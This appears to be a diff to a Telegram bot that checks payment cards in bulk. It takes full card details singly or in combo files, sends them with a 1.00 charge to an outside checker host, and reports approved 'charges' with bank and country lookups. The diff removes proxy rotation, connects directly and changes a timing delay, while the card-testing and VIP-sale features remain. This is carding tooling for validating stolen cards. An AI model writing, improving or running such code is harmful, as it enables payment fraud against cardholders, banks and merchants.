@@ -19,7 +19,6 @@ VIP_USERS = {}
 BANNED_USERS = {}      
 ALL_USERS = set()      
 GATEWAYS = []          
-PROXIES = []          
 stop_users = {}
 last_check_time = {}
 ANTI_SPAM_SECONDS = 7
@@ -66,17 +65,10 @@ async def get_bin_info(bin_number):
 async def check_card_api(card_full, gateway_url):
     params = {"url": gateway_url, "card": card_full, "amount": 1.00}
     
-    # إصلاح طريقة تمرير البروكسي في الإصدارات الجديدة من httpx
-    proxy_url = None
-    if PROXIES:
-        proxy_url = random.choice(PROXIES)
-        if not proxy_url.startswith(("http://", "https://")):
-            proxy_url = f"http://{proxy_url}"
-
     async with api_semaphore:
         try:
-            # استخدام 'proxy' بدلاً من 'proxies' المتوافقة مع التحديث الجديد
-            async with httpx.AsyncClient(proxy=proxy_url, timeout=25) as client:
+            # تم إزالة البروكسي والاتصال مباشر الآن
+            async with httpx.AsyncClient(timeout=25) as client:
                 r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
                 
                 if r.status_code != 200:
@@ -112,7 +104,6 @@ async def format_response(card_full, status, response, taken, gateway_url, user_
     else:
         status_text = "Declined / Error ❌"
         
-    proxy_status = "Active ⚡" if PROXIES else "Off ❌"
     gate_display = f"\n🔹 𝐆𝐚𝐭e𝐰𝐚𝐲: `{gateway_url}`" if user_id in ADMINS else ""
 
     return f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
@@ -128,7 +119,6 @@ async def format_response(card_full, status, response, taken, gateway_url, user_
 ℹ️ 𝐈𝐧𝐟𝐨: `{info}`
 🏛 𝐁𝐚𝐧𝐤: `{bank}`
 🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: `{country}`
-⚙️ 𝐏𝐫𝐨𝐱𝐲: `{proxy_status}`
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"""
 
 # ------------------- Guard Systems -------------------
@@ -157,8 +147,6 @@ async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
 👑 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:
 • `/add [url]` - Add processing gateway route
 • `/rmadd` - Pop last added gateway
-• `/proxy [ip:port]` - Import active system proxy
-• `/rmproxy` - Flush global proxy list
 • `/ban_user [id]` - Lock account out of bot
 • `/unban_user [id]` - Restore access permissions
 • `/prm [id] [days]` - Manually inject VIP membership
@@ -171,7 +159,7 @@ async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ⭐ 𝐕𝐈𝐏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:
 • [Combo File Upload] - Trigger Mass Multi-Loop System Panel
 
-👥 𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:
+👥 𝐅𝐑𝐄𝐄 𝐔𝐒𝐄Ｒ 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:
 • `/start` - Launch active bot matrix
 • `/cmds` - Access available command parameters
 • `/pp [card]` - Single transactional entry gate
@@ -279,7 +267,7 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     
                 start_time = time.time()
                 status, response = await check_card_api(card_full, gateway)
-                await asyncio.sleep(random.uniform(1, 4))
+                await asyncio.sleep(random.uniform(0, 5))
                 taken = round(time.time() - start_time, 2)
                 text = await format_response(card_full, status, response, taken, gateway, user_id)
                 
@@ -293,10 +281,9 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     declined += 1
                     
                 last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
-                proxy_status = "Active ⚡" if PROXIES else "Off ❌"
                 gate_info = f"\n🌐 𝐆𝐚𝐭𝐞: `{gateway}`" if user_id in ADMINS else ""
 
-                panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━裝
+                panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
          ▬▬ [ 𝐌𝐀𝐒𝐒 𝐏𝐀𝐘𝐏𝐀𝐋 ] ▬▬
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 ✅ 𝐂𝐡𝐚𝐫𝐠𝐞: `{approved}` 💎
@@ -310,7 +297,7 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 🏛 𝐁𝐚𝐧𝐤: `{last_bank}`
 🌍 𝐂b𝐮𝐧𝐭𝐫𝐲: `{last_country}`
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🛑 𝐒𝐭b𝐩: `{'ON' if stop_users.get(user_id) else 'OFF'}` | ⚙️ 𝐏r𝐨𝐱𝐲: `{proxy_status}`"""
+🛑 𝐒𝐭b𝐩: `{'ON' if stop_users.get(user_id) else 'OFF'}`"""
                 try:
                     await panel_msg.edit_text(panel, parse_mode="Markdown")
                 except:
@@ -325,30 +312,6 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def error_handler(update, context):
     print(f"Exception Logged: {context.error}")
-
-# ------------------- Proxy Methods -------------------
-
-async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if await check_banned_guard(update): return
-    if update.effective_user.id not in ADMINS:
-        return await update.message.reply_text("❌ Unauthorized Command Set.")
-    if not context.args:
-        return await update.message.reply_text("💡 Usage:\n`/proxy ip:port` or `user:pass@ip:port`", parse_mode="Markdown")
-    proxy = context.args[0]
-    if proxy not in PROXIES:
-        PROXIES.append(proxy)
-        await update.message.reply_text(f"🚀 𝐏𝐫b𝐱𝐲 𝐈𝐦𝐩b𝐫𝐭e𝐝: `{proxy}`", parse_mode="Markdown")
-    else:
-        await update.message.reply_text("❌ Alert: Proxy string signature duplicate.")
-
-async def remove_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if await check_banned_guard(update): return
-    if update.effective_user.id not in ADMINS:
-        return await update.message.reply_text("❌ Unauthorized Command Set.")
-    if not PROXIES:
-        return await update.message.reply_text("❌ Wipe Fault: Proxy dynamic dictionary empty.")
-    removed = PROXIES.pop()
-    await update.message.reply_text(f"🗑 𝐏𝐫b𝐱𝐲 𝐖𝐢𝐩e𝐝: `{removed}`", parse_mode="Markdown")
 
 # ------------------- Administration Subsystem -------------------
 
@@ -500,8 +463,6 @@ def main():
     app.add_handler(CommandHandler("try", try_reply))
     app.add_handler(CommandHandler("SENT", sent_broadcast))
     
-    app.add_handler(CommandHandler("proxy", add_proxy))
-    app.add_handler(CommandHandler("rmproxy", remove_proxy))
     app.add_handler(CommandHandler("add", add_gateway))
     app.add_handler(CommandHandler("rmadd", remove_gateway))
     app.add_handler(CommandHandler("prm", add_prm))
